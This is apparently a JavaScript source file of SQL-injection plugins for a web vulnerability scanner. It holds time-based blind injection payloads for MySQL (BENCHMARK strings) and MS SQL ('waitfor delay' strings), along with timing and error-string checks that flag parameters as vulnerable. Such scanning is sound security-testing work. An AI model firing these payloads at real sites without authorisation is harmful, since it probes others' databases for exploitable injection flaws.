// TODO: send a sample request, get the time and default response
// save that then compare.   We may have an injection that does not work for benchmark
function SQLi_Response_Tester(comb_id, param_name, method, url) {
	this._start = new Date().getTime();
	this._comb_id = comb_id;
	this._param_name = param_name;
	this._method = method;
	this._url = url;
	this._title = "SQL Injection";
	this._detail = "The parameter is vulnerable to SQL Injection.";
	this._minTime = 9999999;
	this._maxTime = 0;

	this.check_result = function(xhr, options) {

		this._end = new Date().getTime();
		//var rmin = this._end - this._start;
		var rtmp = xhr.openargs.ftime - xhr.openargs.stime;

		/*
		if (! "minTime" in options.realthis) { options.realthis._minTime = 99999999; }
		if (! "maxTime" in options.realthis) { options.realthis._maxTime = 0; }
		if (rmin < options.realthis._minTime) { options.realthis._minTime = rmin; }
		if (rmin > options.realthis._maxTime) { options.realthis._maxTime = rmin; }
		console.log("check result", options);
		*/
		var rmin = options.realthis.get_data("sqlimin");
		if (rmin == null || rtmp < rmin)
			options.realthis.set_data("sqlimin", rtmp);

		var rmax = options.realthis.get_data("sqlimax");
		if (rmax == null || rtmp > rmax) {
			options.realthis.set_data("sqlimax", rtmp);
			options.realthis.set_data("sqlipayload", options.payload);
			options.realthis.set_data("sqliproof", "the benchmark took " + (rtmp / 1000) + " seconds");
			options.realthis.set_data("sqlititle", this._title);
			options.realthis.set_data("sqlidetail", this._detail);
			options.realthis.set_data("sqliurl", xhr.openargs.args[1]);
			options.realthis.set_data("sqlipost", param_to_str(options.post));
			options.realthis.set_data("sqlimethod", options.method);
		}

		if (xhr.responseText.indexOf("SQL Server error") > 0 || xhr.responseText.indexOf("Error in query") > 0) {
			console.log("SERVER ERROR: " + options.payload);
			options.realthis.set_data("sqlifail", true);
			options.realthis.set_data("sqlimax", rtmp);
			options.realthis.set_data("sqlipayload", options.payload);
			options.realthis.set_data("sqliproof", "the benchmark took " + (rtmp / 1000) + " seconds");
			options.realthis.set_data("sqlititle", "Possible SQL Injection");
			options.realthis.set_data("sqlidetail", "The test string created a SQL error.  This usually indicates that the parameter is vulnerable to SQL injection, though it may not be exploitable.  This error is at least a bug, and likely a security issue.");
			options.realthis.set_data("sqliurl", xhr.openargs.args[1]);
			options.realthis.set_data("sqlipost", param_to_str(options.post));
			options.realthis.set_data("sqlimethod", options.method);
		} else {
			//console.log("NO server error len: " + xhr.responseText.length + " : " + options.payload);
		}

		return {"result":"pass"};
	}
}

function mysql_test() {
	if (!this)
		return new sql_test();
	base_test.call(this);
	this._vuln_type = "My SQLi";
	this.set_name("My SQLi Plugin");
	this.set_tester(SQLi_Response_Tester);
	this.default_payloads = [
		"BENCHMARK(20000000,sha1(0x41414141414141414141))",
			"1234 or BENCHMARK(20000000,sha1(0x41414141414141414141))", 
			"1234' or BENCHMARK(20000000,sha1(0x41414141414141414141))", 
			"BENCHMARK(20000000,sha1(0x41414141414141414141)) -- f", 
			"1234 or BENCHMARK(20000000,sha1(0x41414141414141414141)) -- f", 
			"1234' or BENCHMARK(20000000,sha1(0x41414141414141414141)) -- f"
				];

	this.pre_test = function(message) {
		var payloads = [];

		if (("mysql" in message.enabled) && message.enabled.mysql) {
			this._vuln_type = "My SQLi";
			payloads.push("BENCHMARK(20000000,sha1(0x41414141414141414141))");
			payloads.push("1234 or BENCHMARK(20000000,sha1(0x41414141414141414141))");
			payloads.push("1234' or BENCHMARK(20000000,sha1(0x41414141414141414141))");
			payloads.push("BENCHMARK(20000000,sha1(0x41414141414141414141)) -- f");
			payloads.push("1234 or BENCHMARK(20000000,sha1(0x41414141414141414141)) -- f");
			payloads.push("1234' or BENCHMARK(20000000,sha1(0x41414141414141414141)) -- f");
		}

		// return true if we should test, and set the payloads for what is enabled
		this.set_payloads(payloads);
		if (payloads.length <= 1) {
			return false;
		}
		return true;
	};

	this.after_test = function() {
		console.log("AFTER TEST", this);

		var min = this.get_data("sqlimin");
		var max = this.get_data("sqlimax");
		var fail = this.get_data("sqlifail");
		var diff = max - min;
		if (diff > 2100 || fail) {
			//console.log("SQL FAIL! " + diff, min, max);
			this._msg.title = this.get_data("sqlititle");
			this._msg.detail = this.get_data("sqlidetail"); //result.detail;
			this._msg.status = xcon.test.fail;
			
			// set the proff
			this._msg.detail += " <span class='base03'>PROOF:</span> <span class='violet'>" + this.get_data("sqliproof") + "</span> <span class='base02'>" + this.get_data("sqlimethod") + " </span> [ <span class='blue'>" + this.get_data("sqliurl") + "</span> (<span class='cyan'>"+this.get_data("sqlipost")+"</span>) ]";
		}
		else {
			//console.log("SQL PASS! " + diff, min, max);
		}
	}
}


function mssql_test() {
	if (!this)
		return new sql_test();
	base_test.call(this);
	this._vuln_type = "MS SQLi";
	this.set_name("MS SQLi Plugin");
	this.set_tester(SQLi_Response_Tester);
	this.default_payloads = [
			"1;waitfor delay '0:0:06' -- f",
			"1';waitfor delay '0:0:06' -- f",
			"1);waitfor delay '0:0:06' -- f",
			"1');waitfor delay '0:0:06' -- f",
			"1));waitfor delay '0:0:06' -- f",
			"1'));waitfor delay '0:0:06' -- f",
			"1)));waitfor delay '0:0:06' -- f",
			"1')));waitfor delay '0:0:06' -- f"
				];

	this.pre_test = function(message) {
		var payloads = [];

		if (("mssql" in message.enabled) && message.enabled.mssql) {
			this._vuln_type = "MS SQLi";
			payloads.push("1;waitfor delay '0:0:06' -- f");
			payloads.push("1';waitfor delay '0:0:06' -- f");
			payloads.push("1);waitfor delay '0:0:06' -- f");
			payloads.push("1');waitfor delay '0:0:06' -- f");
			payloads.push("1));waitfor delay '0:0:06' -- f");
			payloads.push("1'));waitfor delay '0:0:06' -- f");
			payloads.push("1)));waitfor delay '0:0:06' -- f");
			payloads.push("1')));waitfor delay '0:0:06' -- f");
		}

		// return true if we should test, and set the payloads for what is enabled
		this.set_payloads(payloads);
		if (payloads.length <= 1) {
			return false;
		}
		return true;
	};

	this.after_test = function() {
		console.log("AFTER TEST", this);

		var min = this.get_data("sqlimin");
		var max = this.get_data("sqlimax");
		var fail = this.get_data("sqlifail");
		var diff = max - min;
		if (diff > 2100 || fail) {
			//console.log("SQL FAIL! " + diff, min, max);
			this._msg.title = this.get_data("sqlititle");
			this._msg.detail = this.get_data("sqlidetail"); //result.detail;
			this._msg.status = xcon.test.fail;
			
			// set the proff
			this._msg.detail += " <span class='base03'>PROOF:</span> <span class='violet'>" + this.get_data("sqliproof") + "</span> <span class='base02'>" + this.get_data("sqlimethod") + " </span> [ <span class='blue'>" + this.get_data("sqliurl") + "</span> (<span class='cyan'>"+this.get_data("sqlipost")+"</span>) ]";
		}
		else {
			//console.log("SQL PASS! " + diff, min, max);
		}
	}
}




xcon.activetesters.push(mssql_test);
xcon.activetesters.push(mysql_test);
